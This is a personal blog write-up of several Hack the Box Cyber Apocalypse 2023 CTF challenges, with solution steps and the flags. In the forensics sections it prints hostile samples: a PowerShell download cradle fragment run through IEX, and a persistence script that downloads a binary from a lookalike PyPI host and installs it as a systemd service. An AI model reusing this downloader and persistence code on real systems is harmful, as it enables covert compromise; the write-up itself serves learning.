---
title: Hack the Box Cyber Apocalypse CTF 2023
date: 2023-03-23 
categories: [ctf, writeup, htb, jeopardy]
tags: [forensics, hardware, misc, pwn, web, warmup, python, curl]
---

# Hack the Box Cyber Apocalypse 2023 Complete! (≧∇≦)ﾉ

Cyber Apocalypse 2023 was a jeopardy style CTF spanning multiple categories such as: forensics, hardware, pwn, misc, web, machine learning, blockchain and cryptography.

This is my first CTF that I have entered though I continue to complete rooms on TryHackMe, using the HTB Academy and working through the PicoCTF Gym.
I've come to understand during this short experience - there's nothing quite like a live CTF. I hope to continue doing CTFs in future, at least, as much as time allows.

(Will be adding more over time).
- **Posts Added:** trapped source, persistence, plaintext tleasure, alien cradle, extraterrestrial persistence
- **Posts to follow:** getting started, initialise connection, questionnaire, critical flight, debut, and timed transmission


## Warmup

-------------------------

This was a fun little flag to be had after joining the Hack the Box discord. It was hiding in the announcements section as:

``` text
HTB{l3t_th3_tr3asur3_hunt1ng_b3g1n!}
```

## Trapped Source (web)
--------------------

This was a pretty straightforward and these were the steps I took for this challenge:

- Viewed the page source (Ctrl + U or Right-Click + View Page Source)
- Scanned the page for any mention of the HTB flag format HTB{...}
- No flag text present, so I checked for any scripts available
- Found a script named "correctPin" and tried the code "8291"
- Got the flag! 


``` text
HTB{V13w_50urc3_c4n_b3_u53ful!!!}
```


## Persistence (misc)
-------------------

First, I'll say, what a fitting name for this challenge 🤣

At the moment I don't know much about web-based challenges and incorrectly approached this at first. I read the question carefully and soon realised that the page needed to be accessed many, *MANY*  times (around 1000 as per the description).

There may be many ways to approach this, but I used what I knew, which was the handy tool called **cURL**.

At first, I tried to simply use the given url with curl, like so:

``` bash
$ curl ip-address:port/flag
```

And received a garbled string as a result. I knew that it was working, but it wouldn't do to simply repeat this request. So I looked up how to replicate the result continuously.

``` bash
$ while true; do curl ip-address:port/flag; done 
```

Great! This was working as well, but I needed to save the output somewhere:

``` bash
$ while true; do curl --output >(cat >> filename) ip-address:port/flag; done 
```

And after some long time later, a flag appears!
We can view it like so, piping it to grep:

``` bash
$ cat filename | grep "HTB{"
```

Getting the following output:
``` text
HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}
```

## Plaintext Tleasure (forensics)
------------------------------------------------------

This challenge had to be downloaded and contained a zip file, which can easily opened with the following command:

``` bash
$ unzip filename.zip
```

The extract file is named "capture.pcap". which I confirm with the *file* command.
Before searching through the file in its entirety, I decide to try basic commands and see if the flag can be found this way and this is the line which worked:

``` bash
$ strings capture.pcap | grep "HTB{"
```

We get the flag:

``` text
HTB{th3s3_4l13ns_st1ll_us3_HTTP}
```

## Alien Cradle (forensics)
----------------------------------------------------------

We are provided with a zipped folder containing a Powershell script. I confirm the contents:

``` shell
$ file cradle.ps1 

# cradle.ps1: ASCII text, with very long lines (618), with no line terminators
```

Knowing that a lot of text exists within this file, I consider the following command:

``` bash
$ strings cradle.ps1

# [top portion redacted for warnings]...'{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

The flag is hiding within the post, separated in such a manner that the usual 'trick' of "HTB{" won't suffice here, so it was a good choice to check the contents with *strings*  first.

There probably is a more efficient way to extract the flag from this text, but for now, I simply copied the relevant ouput and cleaned it up as per the flag ruling:

``` text
HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}
```

## Extraterrestrial Persistence (forensics)

This challenge was provided as a downloadable zip file, which upon extraction reveals a shell script file. I confirm this as usual:

``` bash
$ file persistence.sh

# persistence.sh: ASCII text, with very long lines (396), with CRLF line terminators
```

Although the file provided is not executable, being a shell script, I opted to view the file contents first:

``` bash
$ cat persistence.sh

# n=`whoami`
# h=`hostname`
# path='/usr/local/bin/service'
# if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi

# curl https://files.pypi-install.com/packeges/service -o $path

# chmod +x $path

# echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service
```

Interesting, not only do we learn a bit of shell script commands, we get an idea of the persistence mechanism the aliens have created (lore information for the CTF, but also knowledge in general). 

The Base64 string seems promising, so I focus my attention there instead.
There are many sites to decode base64 online, but knowing how to achieve the same result from terminal is ideal for learning. 

The output is sent to the terminal via echo and then piped into the base64 utility with the -d tack for the decode option:

``` bash
echo "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==" | base64 -d
```


We are then presented with the following decoded output, with our hiding in the Description portion:
``` text
[Unit]
Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
After=network.target network-online.target

[Service]
Type=oneshot
RemainAfterExit=yes

ExecStart=/usr/local/bin/service
ExecStop=/usr/local/bin/service

[Install]
WantedBy=multi-user.target
```

Flag:
``` text
HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
```


